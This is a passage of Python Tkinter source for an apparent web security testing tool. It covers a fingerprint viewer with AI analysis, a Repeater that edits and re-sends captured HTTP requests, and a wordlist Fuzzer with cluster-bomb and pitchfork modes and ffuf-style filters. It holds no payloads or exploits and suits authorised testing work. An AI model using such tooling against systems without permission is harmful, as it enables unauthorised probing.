        self._host_menu = tk.Menu(self.host_btn, tearoff=0, bg=C['btn'],
                                  fg=C['black'], activebackground=C['sel_bg'],
                                  activeforeground=C['sel_fg'], font=C['font'])
        self.host_btn.config(menu=self._host_menu)
        self.host_btn.pack(side='right')
        fp_frame = tk.Frame(wrap, bg=C['bg'])
        fp_frame.pack(fill='both', expand=True, pady=(2, 6))
        self.fp_txt = Text95(fp_frame, height=14)
        fp_sb = tk.Scrollbar(fp_frame, orient='vertical', command=self.fp_txt.yview)
        self.fp_txt.config(yscrollcommand=fp_sb.set)
        self.fp_txt.pack(side='left', fill='both', expand=True)
        fp_sb.pack(side='right', fill='y')

        # The tech scan now runs as part of the target scan, so this dialog is a
        # passive viewer — the only action is the AI analysis of the result.
        bar = tk.Frame(wrap, bg=C['bg'])
        bar.pack(fill='x', pady=(0, 6))
        self.ai_btn = Btn(bar, text='Analyze with AI', command=self._do_analyze)
        self.ai_btn.pack(side='left')

        tk.Label(wrap, text='AI analysis:', bg=C['bg'],
                 font=C['font_b']).pack(anchor='w')
        ai_frame = tk.Frame(wrap, bg=C['bg'])
        ai_frame.pack(fill='both', expand=True, pady=(2, 0))
        self.ai_txt = Text95(ai_frame, wrap='word', height=12)
        ai_sb = tk.Scrollbar(ai_frame, orient='vertical', command=self.ai_txt.yview)
        self.ai_txt.config(yscrollcommand=ai_sb.set)
        self.ai_txt.pack(side='left', fill='both', expand=True)
        ai_sb.pack(side='right', fill='y')

        self.update_idletasks()
        px = parent.winfo_rootx() + parent.winfo_width() // 2 - 360
        py = parent.winfo_rooty() + parent.winfo_height() // 2 - 280
        self.geometry(f'720x560+{max(px, 0)}+{max(py, 0)}')

    def set_hosts(self, hosts, current=None):
        """Populate the Subdomains dropdown. `hosts` is a list of (host_label,
        target_url); selecting one calls on_select(target_url)."""
        self._host_menu.delete(0, 'end')
        for label, url in hosts:
            self._host_menu.add_radiobutton(
                label=label, value=url, variable=self._host_var,
                command=lambda u=url: (self.on_select and self.on_select(u)))
        self.host_btn.config(state=('normal' if hosts else 'disabled'))
        if current:
            self.set_host_label(current)

    def set_host_label(self, target):
        """Set the Subdomains button label to `target`'s host."""
        host = _host_only(urlparse(target).netloc) or target
        self._host_var.set(target)
        self.host_btn.config(text=_subdomain_btn_text(host))

    def set_fingerprint(self, text: str):
        """Show `text` in the fingerprint pane."""
        self.fp_txt.set_content(text)

    def set_ai(self, text: str):
        """Show `text` in the AI-analysis pane."""
        self.ai_txt.set_content(text)

    def _do_analyze(self):
        """Request the AI analysis from the app (which owns the run so it
        survives this popup closing), if a fingerprint is present."""
        if self.fp_txt.get('1.0', 'end').strip():
            self.on_analyze()


# ─────────────────────────────────────────────
# Helper: a request-editor + response pane reused by Repeater & Fuzzer
# ─────────────────────────────────────────────




def _build_req_resp_fixed(parent, req_label='Request (line + headers):',
                          resp_label='Response:', body_label='Body:',
                          resp_body_label='Response body:',
                          req_editable=True, resp_editable=False):
    """Request/response editor with a draggable HEADERS-over-BODIES split: the
    request + response headers share the top pane (side by side) and the request +
    response bodies share the bottom pane, with one horizontal sash between them —
    so dragging it trades space between *both* headers and *both* bodies at once.
    `resp_editable` makes the response panes editable too (the proxy edits
    intercepted responses). Returns (container, req_text, body_text, resp_text,
    resp_body_text)."""
    cont = tk.Frame(parent, bg=C['bg'])
    split = ttk.PanedWindow(cont, orient='vertical')
    split.pack(fill='both', expand=True)

    def cell(grid_parent, col, label, editable, height):
        """Build a labelled, vertically-scrolled text box in column `col` of a
        2-column row and return the text widget."""
        col_f = tk.Frame(grid_parent, bg=C['bg'])
        col_f.grid(row=0, column=col, sticky='nsew',
                   padx=((0, 3) if col == 0 else (3, 0)))
        col_f.rowconfigure(1, weight=1)
        col_f.columnconfigure(0, weight=1)
        tk.Label(col_f, text=label, bg=C['bg'],
                 font=C['font_b']).grid(row=0, column=0, sticky='w')
        wrap = tk.Frame(col_f, bg=C['bg'])
        wrap.grid(row=1, column=0, sticky='nsew', pady=(2, 0))
        txt = (EditText95 if editable else Text95)(wrap, height=height)
        sb = tk.Scrollbar(wrap, orient='vertical', command=txt.yview)
        txt.config(yscrollcommand=sb.set)
        txt.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')
        return txt

    # Top pane: both headers side by side.
    hdr = tk.Frame(split, bg=C['bg'])
    hdr.rowconfigure(0, weight=1)
    hdr.columnconfigure(0, weight=1, uniform='rr')
    hdr.columnconfigure(1, weight=1, uniform='rr')
    req_txt  = cell(hdr, 0, req_label,  req_editable,  height=10)
    resp_txt = cell(hdr, 1, resp_label, resp_editable, height=10)

    # Bottom pane: both bodies side by side.
    bod = tk.Frame(split, bg=C['bg'])
    bod.rowconfigure(0, weight=1)
    bod.columnconfigure(0, weight=1, uniform='rr')
    bod.columnconfigure(1, weight=1, uniform='rr')
    body_txt      = cell(bod, 0, body_label,      req_editable,  height=6)
    resp_body_txt = cell(bod, 1, resp_body_label, resp_editable, height=6)

    split.add(hdr, weight=3)
    split.add(bod, weight=2)
    # Start with the headers taking ~60% of the height (the sash is then free).
    def _init_sash():
        """Place the headers/bodies sash at ~60% once the pane has a real size."""
        try:
            split.update_idletasks()
            h = split.winfo_height()
            if h > 60:
                split.sashpos(0, int(h * 0.6))
        except Exception:
            pass
    split.after(200, _init_sash)
    return cont, req_txt, body_txt, resp_txt, resp_body_txt


def _set_split(head_widget, body_widget, raw):
    """Show a raw HTTP message split across a status/headers widget and a body
    widget (used for both the request and the response panes)."""
    head, body = split_req_body(raw)
    head_widget.set_content(head)
    body_widget.set_content(body)


def _get_combined(head_widget, body_widget):
    """Recombine a status/headers widget + body widget into one raw HTTP
    message (inverse of _set_split)."""
    return combine_req_body(head_widget.get('1.0', 'end'),
                            body_widget.get('1.0', 'end'))


# ─────────────────────────────────────────────
# Repeater — edit the captured request and re-send it.
# ─────────────────────────────────────────────
class RequestEditorDialog(ModalToplevel):
    """The Repeater: edit a node's captured request (Data In) or any of the
    requests it can make (Data Out), re-send it, and optionally save the result
    as a new node via `on_save`."""
    def __init__(self, parent, node: SiteNode, on_save=None):
        """Build the Repeater for `node` with the Data In / Data Out views."""
        super().__init__(parent)
        self.node = node
        self.on_save = on_save
        self._has_response = False
        self._do_has_response = False
        self._do_base_url = node.url
        self._do_sel_raw = None
        self.encode_var = tk.BooleanVar(value=False)
        self.title(f'Repeater — {node.url[:80]}')
        self.configure(bg=C['bg'])

        wrap = tk.Frame(self, bg=C['bg'])
        wrap.pack(fill='both', expand=True, padx=8, pady=8)

        # View selector: Data In (the request that fetched this node + its
        # response) or Data Out (the list of requests the node can use).
        self.view_var = tk.StringVar(value='in')
        sel = tk.Frame(wrap, bg=C['bg'])
        sel.pack(fill='x', pady=(0, 6))
        tk.Radiobutton(
            sel, text='Input  (request that fetched this page + its response)',
            variable=self.view_var, value='in', command=self._switch_view,
            bg=C['bg'], activebackground=C['bg'], selectcolor=C['window'],
            highlightthickness=0, font=C['font']).pack(side='left')
        tk.Radiobutton(
            sel, text='Output  (requests this page can use)',
            variable=self.view_var, value='out', command=self._switch_view,
            bg=C['bg'], activebackground=C['bg'], selectcolor=C['window'],
            highlightthickness=0, font=C['font']).pack(side='left', padx=(12, 0))

        # Stack: one frame per view, swapped by _switch_view().
        self.stack = tk.Frame(wrap, bg=C['bg'])
        self.stack.pack(fill='both', expand=True)

        # ── Data In view: fixed left/right request + response, with buttons ──
        self.in_frame = tk.Frame(self.stack, bg=C['bg'])
        cont, self.req_txt, self.body_txt, self.resp_txt, self.resp_body_txt = \
            _build_req_resp_fixed(self.in_frame)
        cont.pack(fill='both', expand=True)
        _bind_urlencode(self.req_txt, self.encode_var.get)
        _bind_urlencode(self.body_txt, self.encode_var.get)
        bar = tk.Frame(self.in_frame, bg=C['bg'])
        bar.pack(fill='x', pady=(6, 0))
        self.send_btn = Btn(bar, text='  Send  ', command=self._send,
                            bg='#2e7d32', fg='white')
        self.send_btn.pack(side='left')
        Btn(bar, text='Reset to original',
            command=self._reset).pack(side='left', padx=6)
        self.save_btn = Btn(bar, text='Save as New Node',
                            command=self._save_as_node, state='disabled')
        self.save_btn.pack(side='left', padx=6)
        tk.Checkbutton(bar, text='URL-encode typing', variable=self.encode_var,
                       bg=C['bg'], activebackground=C['bg'],
                       selectcolor=C['window'], highlightthickness=0,
                       font=C['font']).pack(side='right')

        # ── Data Out view: list (top 2/3) of requests the node can use, one per
        #    line with horizontal scroll; selecting one loads it into the editor
        #    (bottom 1/3) which has the same Send / Reset / Save buttons. ──
        self.out_frame = tk.Frame(self.stack, bg=C['bg'])
        self.out_frame.columnconfigure(0, weight=1)
        self.out_frame.rowconfigure(0, weight=2)
        self.out_frame.rowconfigure(1, weight=1)

        la = tk.Frame(self.out_frame, bg=C['bg'])
        la.grid(row=0, column=0, sticky='nsew')
        tk.Label(la, text='Requests this node can use — select one to load it '
                 'below:', bg=C['bg'], font=C['font_b']).pack(anchor='w')
        hsb = tk.Scrollbar(la, orient='horizontal')
        hsb.pack(side='bottom', fill='x')
        lwrap = tk.Frame(la, bg=C['bg'])
        lwrap.pack(fill='both', expand=True, pady=(2, 0))
        self.do_list = tk.Listbox(lwrap, activestyle='none', exportselection=False,
                                  bg=C['window'], fg=C['black'], font=C['mono'],
                                  selectbackground=C['sel_bg'],
                                  selectforeground=C['sel_fg'], relief='sunken', bd=2)
        vsb = tk.Scrollbar(lwrap, orient='vertical', command=self.do_list.yview)
        self.do_list.config(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        hsb.config(command=self.do_list.xview)
        self.do_list.pack(side='left', fill='both', expand=True)
        vsb.pack(side='right', fill='y')

        ea = tk.Frame(self.out_frame, bg=C['bg'])
        ea.grid(row=1, column=0, sticky='nsew', pady=(4, 0))
        # Pack the button bar at the bottom FIRST so it always keeps its full
        # height; the request/response editor then fills whatever space is left
        # (rather than expanding and squashing the buttons).
        dobar = tk.Frame(ea, bg=C['bg'])
        dobar.pack(side='bottom', fill='x', pady=(4, 0))
        self.do_send_btn = Btn(dobar, text='  Send  ', command=self._do_send,
                               bg='#2e7d32', fg='white')
        self.do_send_btn.pack(side='left')
        Btn(dobar, text='Reset to original',
            command=self._do_reset).pack(side='left', padx=6)
        self.do_save_btn = Btn(dobar, text='Save as New Node',
                               command=self._do_save, state='disabled')
        self.do_save_btn.pack(side='left', padx=6)
        tk.Checkbutton(dobar, text='URL-encode typing', variable=self.encode_var,
                       bg=C['bg'], activebackground=C['bg'],
                       selectcolor=C['window'], highlightthickness=0,
                       font=C['font']).pack(side='right')
        docont, self.do_req_txt, self.do_body_txt, self.do_resp_txt, \
            self.do_resp_body_txt = _build_req_resp_fixed(ea)
        docont.pack(side='top', fill='both', expand=True)
        _bind_urlencode(self.do_req_txt, self.encode_var.get)
        _bind_urlencode(self.do_body_txt, self.encode_var.get)

        # Populate the Data Out list, one request per line.
        self._do_items = []
        for e in compute_data_out(node):
            url = e.get('action') or node.url
            params = e.get('params') or {}
            names = ', '.join(params.keys()) if params else '—'
            self._do_items.append({'method': e.get('method', 'GET').upper(),
                                   'url': url, 'params': params})
            self.do_list.insert(
                'end', f"{e.get('method', 'GET').upper():<6} {url}   [{names}]")
        if not self._do_items:
            self.do_list.insert('end', '(no requests — this node makes no XHR/'
                                'fetch and has no forms or parameterized links)')
        self.do_list.bind('<<ListboxSelect>>', self._do_select)
        self.do_req_txt.set_content('(select a request above)')
        self.do_body_txt.set_content('')
        _set_split(self.do_resp_txt, self.do_resp_body_txt,
                   '(no response — click Send)')

        self._reset()
        self._switch_view()

        self.update_idletasks()
        px = parent.winfo_rootx() + parent.winfo_width() // 2 - 480
        py = parent.winfo_rooty() + parent.winfo_height() // 2 - 360
        self.geometry(f'960x720+{max(px, 0)}+{max(py, 0)}')

    def _switch_view(self):
        """Show the Data In or Data Out frame per the radio selection."""
        self.in_frame.pack_forget()
        self.out_frame.pack_forget()
        if self.view_var.get() == 'out':
            self.out_frame.pack(fill='both', expand=True)
        else:
            self.in_frame.pack(fill='both', expand=True)

    @staticmethod
    def _raw_request_from(method, url, params):
        """Build a raw HTTP request from a Data Out entry. GET-like methods put
        params in the query string; others send them as a JSON body."""
        method = (method or 'GET').upper()
        pu = urlparse(url)
        flat = {k: (v[0] if isinstance(v, list) and v else
                    ('' if isinstance(v, list) else v))
                for k, v in (params or {}).items()}
        headers, body = [], ''
        if method in ('GET', 'HEAD', 'DELETE'):
            q = '&'.join(x for x in (pu.query, urlencode(flat)) if x)
            path = (pu.path or '/') + (('?' + q) if q else '')
        else:
            path = (pu.path or '/') + (('?' + pu.query) if pu.query else '')
            if flat:
                body = json.dumps(flat, ensure_ascii=False)
                headers.append('Content-Type: application/json')
        lines = [f'{method} {path} HTTP/1.1', f'Host: {pu.netloc}'] + headers
        return '\n'.join(lines) + '\n\n' + body

    # ── shared node builder (used by both Data In and Data Out "Save") ──
    def _build_saved_node(self, raw_req, raw_resp, base_url):
        """Parse a raw request/response pair into a new edited SiteNode (shared by
        the Data In and Data Out 'Save' actions). Returns None on parse failure."""
        parsed_req = parse_raw_request(raw_req, base_url)
        if not parsed_req:
            messagebox.showerror('Save error', 'Could not parse request line.')
            return None
        method, url, req_headers, req_body = parsed_req
        parsed_resp = parse_raw_response(raw_resp)
        if parsed_resp:
            status, reason, resp_headers, resp_body = parsed_resp
        else:
            status, reason, resp_headers, resp_body = None, '', {}, raw_resp
        new = SiteNode(url=url, node_type=self.node.node_type,
                       parent_url=self.node.url)
        new.req_method   = method
        new.req_url      = url
        new.req_headers  = dict(req_headers)
        new.req_body     = req_body or ''
        new.headers      = dict(req_headers)
        new.title        = (self.node.title or '') + ' (edited)'
        new.status_code  = status
        new.content_type = (resp_headers.get('Content-Type', '')
                            if resp_headers else '') or self.node.content_type
        new.resp_status  = status
        new.resp_reason  = reason
        new.resp_headers = dict(resp_headers) if resp_headers else {}
        new.resp_body    = resp_body
        new.raw_html     = resp_body
        new.text_content = resp_body
        new.scanned      = True
        new.edited       = True
        return new

    # ── Data In actions ──
    def _reset(self):
        """Restore the Data-In editor to the node's original request, splitting
        the captured request into the headers editor and the Body box."""
        head, body = split_req_body(InfoPanel._fmt_request(self.node))
        self.req_txt.set_content(head)
        self.body_txt.set_content(body)
        _set_split(self.resp_txt, self.resp_body_txt,
                   '(no response — click Send)')
        self._has_response = False
        self.save_btn.config(state='disabled')

    def _send(self):
        """Send the edited Data-In request on a background thread and show the
        response."""
        raw = combine_req_body(self.req_txt.get('1.0', 'end'),
                               self.body_txt.get('1.0', 'end')).rstrip()
        _set_split(self.resp_txt, self.resp_body_txt, 'Sending… please wait.')
        self.send_btn.config(state='disabled')
        self.save_btn.config(state='disabled')

        def run():
            """Worker: send the raw request and update the response pane."""
            r, text = send_raw_request(raw, self.node.req_url or self.node.url)
            if not self.winfo_exists():
                return
            got = r is not None
            def update():
                """Apply the response to the UI on the main thread."""
                _set_split(self.resp_txt, self.resp_body_txt, text)
                self.send_btn.config(state='normal')
                self._has_response = got
                self.save_btn.config(
                    state=('normal' if got and self.on_save else 'disabled'))
            self.after(0, update)

        threading.Thread(target=run, daemon=True).start()

    def _save_as_node(self):
        """Save the current Data-In request/response as a new edited node."""
        if not self.on_save:
            return
        if not self._has_response:
            messagebox.showinfo('No response',
                                'Send the request first to capture a response.')
            return
        new = self._build_saved_node(
            combine_req_body(self.req_txt.get('1.0', 'end'),
                             self.body_txt.get('1.0', 'end')).rstrip(),
            _get_combined(self.resp_txt, self.resp_body_txt).rstrip(),
            self.node.req_url or self.node.url)
        if new is not None:
            self.on_save(new)
            self.save_btn.config(state='disabled')

    # ── Data Out actions ──
    def _do_select(self, _evt=None):
        """Load the selected Data-Out request into the editor as raw HTTP."""
        sel = self.do_list.curselection()
        if not sel or sel[0] >= len(self._do_items):
            return
        item = self._do_items[sel[0]]
        self._do_base_url = item['url']
        self._do_sel_raw = self._raw_request_from(
            item['method'], item['url'], item['params'])
        head, body = split_req_body(self._do_sel_raw)
        self.do_req_txt.set_content(head)
        self.do_body_txt.set_content(body)
        _set_split(self.do_resp_txt, self.do_resp_body_txt,
                   '(no response — click Send)')
        self._do_has_response = False
        self.do_save_btn.config(state='disabled')

    def _do_reset(self):
        """Restore the Data-Out editor to the selected request's original text."""
        if self._do_sel_raw is None:
            return
        head, body = split_req_body(self._do_sel_raw)
        self.do_req_txt.set_content(head)
        self.do_body_txt.set_content(body)
        _set_split(self.do_resp_txt, self.do_resp_body_txt,
                   '(no response — click Send)')
        self._do_has_response = False
        self.do_save_btn.config(state='disabled')

    def _do_send(self):
        """Send the edited Data-Out request on a background thread and show the
        response."""
        raw = combine_req_body(self.do_req_txt.get('1.0', 'end'),
                               self.do_body_txt.get('1.0', 'end')).rstrip()
        if not raw or self._do_sel_raw is None:
            messagebox.showinfo('No request', 'Select a request from the list first.')
            return
        _set_split(self.do_resp_txt, self.do_resp_body_txt,
                   'Sending… please wait.')
        self.do_send_btn.config(state='disabled')
        self.do_save_btn.config(state='disabled')
        base = self._do_base_url or self.node.url

        def run():
            """Worker: send the raw request and update the response pane."""
            r, text = send_raw_request(raw, base)
            if not self.winfo_exists():
                return
            got = r is not None
            def update():
                """Apply the response to the UI on the main thread."""
                _set_split(self.do_resp_txt, self.do_resp_body_txt, text)
                self.do_send_btn.config(state='normal')
                self._do_has_response = got
                self.do_save_btn.config(
                    state=('normal' if got and self.on_save else 'disabled'))
            self.after(0, update)

        threading.Thread(target=run, daemon=True).start()

    def _do_save(self):
        """Save the current Data-Out request/response as a new edited node."""
        if not self.on_save:
            return
        if not self._do_has_response:
            messagebox.showinfo('No response',
                                'Send the request first to capture a response.')
            return
        new = self._build_saved_node(
            combine_req_body(self.do_req_txt.get('1.0', 'end'),
                             self.do_body_txt.get('1.0', 'end')).rstrip(),
            _get_combined(self.do_resp_txt, self.do_resp_body_txt).rstrip(),
            self._do_base_url or self.node.url)
        if new is not None:
            self.on_save(new)
            self.do_save_btn.config(state='disabled')


# ─────────────────────────────────────────────
# ffuf-style match / filter (used by the Fuzzer to decide which payload
# responses are "interesting" — match keeps only, filter excludes).
# ─────────────────────────────────────────────




# ─────────────────────────────────────────────
# Fuzzer — replay the request with a list of payloads at marked positions.
# ─────────────────────────────────────────────
class FuzzerDialog(ModalToplevel):
    """The Fuzzer: replay a node's request with wordlist payloads substituted at
    one or more {{FUZZ}} positions, filter the results with ffuf-style match/
    filter rules, and save interesting hits as new nodes via `on_save`."""
    def __init__(self, parent, node: SiteNode, on_save=None):
        """Build the Fuzzer for `node`: request template, payload positions,
        attack mode, match/filter inputs and the results table."""
        super().__init__(parent)
        self.node = node
        self.on_save = on_save
        self.results: list[tuple[str, int, int, str, str]] = []
        self._running = False
        self._stop_requested = False
        self.encode_var = tk.BooleanVar(value=False)
        self.payload_encode_var = tk.BooleanVar(value=False)

        self.title(f'Fuzzer — {node.url[:80]}')
        self.configure(bg=C['bg'])

        wrap = tk.Frame(self, bg=C['bg'])
        wrap.pack(fill='both', expand=True, padx=8, pady=8)

        # Top: request template
        rlab = tk.Frame(wrap, bg=C['bg'])
        rlab.pack(fill='x')
        tk.Label(rlab,
                 text='Request (mark positions with  {{FUZZ1}} {{FUZZ2}} … ):',
                 bg=C['bg'], font=C['font_b']).pack(side='left')
        tk.Checkbutton(rlab, text='URL-encode typing', variable=self.encode_var,
                       bg=C['bg'], activebackground=C['bg'],
                       selectcolor=C['window'], highlightthickness=0,
                       font=C['font']).pack(side='right')
        rf = tk.Frame(wrap, bg=C['bg'])
        rf.pack(fill='both', expand=True, pady=(2, 4))
        self.req_txt = EditText95(rf, height=8)
        rsb = tk.Scrollbar(rf, orient='vertical', command=self.req_txt.yview)
        self.req_txt.config(yscrollcommand=rsb.set)
        self.req_txt.pack(side='left', fill='both', expand=True)
        rsb.pack(side='right', fill='y')
        _bind_urlencode(self.req_txt, self.encode_var.get)

        # Dedicated body editor — sent verbatim as the request body. {{FUZZn}}
        # positions may be placed here too (e.g. to fuzz a value in the body).
        tk.Label(wrap, text='Body (sent as the request body; may hold {{FUZZ}} '
                 'positions):', bg=C['bg'], font=C['font_b']).pack(anchor='w')
        bf = tk.Frame(wrap, bg=C['bg'])
        bf.pack(fill='x', pady=(2, 6))
        self.body_txt = EditText95(bf, height=6)
        bsb = tk.Scrollbar(bf, orient='vertical', command=self.body_txt.yview)
        self.body_txt.config(yscrollcommand=bsb.set)
        self.body_txt.pack(side='left', fill='both', expand=True)
        bsb.pack(side='right', fill='y')
        _bind_urlencode(self.body_txt, self.encode_var.get)

        # ── Middle: fuzz positions + per-position payloads ──────────────
        # Multiple positions are supported: mark them in the request with
        # {{FUZZ1}}, {{FUZZ2}}, … (bare {{FUZZ}} is treated as position 1).
        # Each position keeps its own payload list (typed or loaded from a
        # wordlist); the position strip below switches which list the editor
        # shows. The attack mode decides how the lists combine:
        #   • Cluster bomb — every combination of all lists (Cartesian product).
        #   • Pitchfork    — lists advance in lockstep (stops at the shortest).
        self.pos_payloads: dict[int, str] = {}
        self.active_pos = None
        self.mode_var = tk.StringVar(value='Cluster bomb')

        ptop = tk.Frame(wrap, bg=C['bg'])
        ptop.pack(fill='x')
        self.pos_label = tk.Label(ptop, text='Payloads (one per line):',
                                  bg=C['bg'], font=C['font_b'])
        self.pos_label.pack(side='left')
        # URL-encode each payload before it's substituted into the request —
        # applies to payloads whether typed or loaded from a wordlist file.
        tk.Checkbutton(ptop, text='URL-encode payloads',
                       variable=self.payload_encode_var,
                       bg=C['bg'], activebackground=C['bg'],
                       selectcolor=C['window'], highlightthickness=0,
                       font=C['font']).pack(side='left', padx=(12, 0))
        Btn(ptop, text='Insert position',
            command=self._insert_marker).pack(side='right', padx=2)
        Btn(ptop, text='Load Wordlist',
            command=self._load_wordlist).pack(side='right', padx=2)
        Btn(ptop, text='Clear',
            command=self._clear_payloads).pack(side='right', padx=2)

        # Position selector + attack-mode chooser — dropdown menus matching the
        # Site Structure Graph's "Menu ▾" button style.
        psel = tk.Frame(wrap, bg=C['bg'])
        psel.pack(fill='x', pady=(2, 0))
        tk.Label(psel, text='Edit position:', bg=C['bg'],
                 font=C['font']).pack(side='left')
        self.pos_btn = tk.Menubutton(psel, text='(no positions) ▾', bg=C['btn'],
                                     activebackground=C['btn'], relief='raised',
                                     bd=2, font=C['font'], padx=6,
                                     highlightthickness=0)
        self.pos_menu = tk.Menu(self.pos_btn, tearoff=0, bg=C['btn'],
                                fg=C['black'], activebackground=C['sel_bg'],
                                activeforeground=C['sel_fg'], font=C['font'])
        self.pos_btn.config(menu=self.pos_menu)
        self.pos_btn.pack(side='left', padx=(4, 0))
        Btn(psel, text='Refresh',
            command=self._refresh_positions).pack(side='left', padx=6)
        tk.Label(psel, text='Mode:', bg=C['bg'],
                 font=C['font']).pack(side='left', padx=(8, 2))
        self.mode_btn = tk.Menubutton(psel, text=self.mode_var.get() + ' ▾',
                                      bg=C['btn'], activebackground=C['btn'],
                                      relief='raised', bd=2, font=C['font'],
                                      padx=6, highlightthickness=0)
        mode_menu = tk.Menu(self.mode_btn, tearoff=0, bg=C['btn'], fg=C['black'],
                            activebackground=C['sel_bg'],
                            activeforeground=C['sel_fg'], font=C['font'])
        for m in ('Cluster bomb', 'Pitchfork'):
            mode_menu.add_command(label=m, command=lambda m=m: self._set_mode(m))
        self.mode_btn.config(menu=mode_menu)
        self.mode_btn.pack(side='left')

        pf = tk.Frame(wrap, bg=C['bg'])
        pf.pack(fill='x', pady=(2, 6))
        self.payloads_txt = EditText95(pf, height=6)
        psb = tk.Scrollbar(pf, orient='vertical', command=self.payloads_txt.yview)
        self.payloads_txt.config(yscrollcommand=psb.set)
        self.payloads_txt.pack(side='left', fill='both', expand=True)
        psb.pack(side='right', fill='y')

        # ffuf-style match / filter on the responses. Comma lists + ranges
        # ("200,301,400-499"); empty = no constraint. -mc/-ms keep only matches,
        # -fc/-fs exclude. A result is shown only if it passes all set criteria.
        mff = tk.Frame(wrap, bg=C['bg'])
        mff.pack(fill='x', pady=(0, 6))
        tk.Label(mff, text='Match/Filter:', bg=C['bg'],
                 font=C['font_b']).pack(side='left', padx=(0, 4))
        self.mc_var = tk.StringVar(); self.ms_var = tk.StringVar()
        self.fc_var = tk.StringVar(); self.fs_var = tk.StringVar()
        for lbl, var in (('-mc', self.mc_var), ('-ms', self.ms_var),
                         ('-fc', self.fc_var), ('-fs', self.fs_var)):
            tk.Label(mff, text=lbl, bg=C['bg'], font=C['font']).pack(side='left', padx=(6, 1))
            Entry95(mff, textvariable=var, width=9).pack(side='left')

        bar = tk.Frame(wrap, bg=C['bg'])
        bar.pack(fill='x', pady=(0, 6))
        self.start_btn = Btn(bar, text='  Start  ', command=self._start,
                             bg='#2e7d32', fg='white')
        self.start_btn.pack(side='left')
        self.stop_btn = Btn(bar, text=' Stop ', command=self._stop,
                            bg='#b71c1c', fg='white', state='disabled')
        self.stop_btn.pack(side='left', padx=4)
        # Save the currently-selected result as a node in the graph.
        self.save_btn = Btn(bar, text='Save Node', command=self._save_selected,
                            state='disabled')
        self.save_btn.pack(side='left', padx=4)
        Btn(bar, text='Clear Results',
            command=self._clear_results).pack(side='left', padx=4)
        # Same Chicago95 loading bar + success/fail indicator the main
        # toolbar uses, so the user can see when the fuzzer is still
        # running and whether the last run finished cleanly.
        self.status_box = StatusBox(bar, size=18)
        self.status_box.pack(side='right', padx=2)
        self.progress = Chicago95Progress(bar, width=150, height=16)
        self.progress.pack(side='right', padx=6)

        # Bottom: results list (fixed width) + response viewer (fills the rest).
        # No draggable sash — the two panes are fixed-size.
        bottom = tk.Frame(wrap, bg=C['bg'])
        bottom.pack(fill='both', expand=True)

        lf = tk.Frame(bottom, bg=C['bg'], width=440)
        lf.pack(side='left', fill='y')
        lf.pack_propagate(False)
        tk.Label(lf, text='Results:', bg=C['bg'],
                 font=C['font_b']).pack(anchor='w')
        lwrap = tk.Frame(lf, bg=C['bg'])
        lwrap.pack(fill='both', expand=True, pady=(2, 0))
        self.results_lb = tk.Listbox(lwrap, bg=C['window'], fg=C['black'],
                                     font=C['mono'],
                                     selectbackground=C['sel_bg'],
                                     selectforeground=C['sel_fg'],
                                     relief='sunken', bd=2,
                                     activestyle='none', highlightthickness=0)
        lsb = tk.Scrollbar(lwrap, orient='vertical',
                           command=self.results_lb.yview)
        self.results_lb.config(yscrollcommand=lsb.set)
        self.results_lb.pack(side='left', fill='both', expand=True)
        lsb.pack(side='right', fill='y')
        self.results_lb.bind('<<ListboxSelect>>', self._on_select)

        rrf = tk.Frame(bottom, bg=C['bg'])
        rrf.pack(side='left', fill='both', expand=True, padx=(6, 0))
        tk.Label(rrf, text='Response:', bg=C['bg'],
                 font=C['font_b']).pack(anchor='w')
        rwrap = tk.Frame(rrf, bg=C['bg'])
        rwrap.pack(fill='both', expand=True, pady=(2, 0))
        self.resp_txt = Text95(rwrap)
        rsbb = tk.Scrollbar(rwrap, orient='vertical',
                            command=self.resp_txt.yview)
        self.resp_txt.config(yscrollcommand=rsbb.set)
        self.resp_txt.pack(side='left', fill='both', expand=True)
        rsbb.pack(side='right', fill='y')
        # Response body in its own box below the status line + headers.
        tk.Label(rrf, text='Response body:', bg=C['bg'],
                 font=C['font_b']).pack(anchor='w', pady=(4, 0))
        rbwrap = tk.Frame(rrf, bg=C['bg'])
        rbwrap.pack(fill='x', pady=(2, 0))
        self.resp_body_txt = Text95(rbwrap, height=8)
        rbsb = tk.Scrollbar(rbwrap, orient='vertical',
                            command=self.resp_body_txt.yview)
        self.resp_body_txt.config(yscrollcommand=rbsb.set)
        self.resp_body_txt.pack(side='left', fill='both', expand=True)
        rbsb.pack(side='right', fill='y')

        head, body = split_req_body(InfoPanel._fmt_request(node))
        self.req_txt.set_content(head)
        self.body_txt.set_content(body)
        # Pick up any positions already present in the prefilled request.
        self._refresh_positions()
        # Column header for the listbox.
        self._add_header_row()

        self.update_idletasks()
        px = parent.winfo_rootx() + parent.winfo_width() // 2 - 540
        py = parent.winfo_rooty() + parent.winfo_height() // 2 - 400
        self.geometry(f'1080x800+{max(px, 0)}+{max(py, 0)}')

    # ── results listbox ─────────────────────────────────────────────
    def _add_header_row(self):
        """Insert the (non-selectable) column header row into the results list."""
        self.results_lb.delete(0, 'end')
        self.results_lb.insert('end',
            f'{"#":>4}  {"Status":>6}  {"Length":>7}  Payload')

    def _clear_results(self):
        """Clear the results table, response pane and selection."""
        self.results = []
        self._add_header_row()
        _set_split(self.resp_txt, self.resp_body_txt, '')
        self.save_btn.config(state='disabled')

    def _on_select(self, _e):
        """Show the selected result's response and enable Save Node for it."""
        idxs = self.results_lb.curselection()
        if not idxs or idxs[0] == 0:
            self.save_btn.config(state='disabled')
            return
        i = idxs[0] - 1
        if 0 <= i < len(self.results):
            _set_split(self.resp_txt, self.resp_body_txt, self.results[i][3])
            self.save_btn.config(
                state=('normal' if self.on_save else 'disabled'))
        else:
            self.save_btn.config(state='disabled')

    def _save_selected(self):
        """Save the selected result (its sent request + captured response) as an
        edited node in the graph, via the on_save callback."""
        if not self.on_save:
            return
        idxs = self.results_lb.curselection()
        if not idxs or idxs[0] == 0:
            messagebox.showinfo('No selection', 'Select a result row first.')
            return
        i = idxs[0] - 1
        if not (0 <= i < len(self.results)):
            return
        shown, status, length, raw, raw_req = self.results[i]
        base = self.node.req_url or self.node.url
        parsed_req = parse_raw_request(raw_req, base)
        if not parsed_req:
            messagebox.showerror('Save error', 'Could not parse the request.')
            return
        method, url, req_headers, req_body = parsed_req
        parsed_resp = parse_raw_response(raw)
        if parsed_resp:
            rstatus, reason, resp_headers, resp_body = parsed_resp
        else:
            rstatus, reason, resp_headers, resp_body = status, '', {}, raw
        new = SiteNode(url=url, node_type=self.node.node_type,
                       parent_url=self.node.url)
        new.req_method   = method
        new.req_url      = url
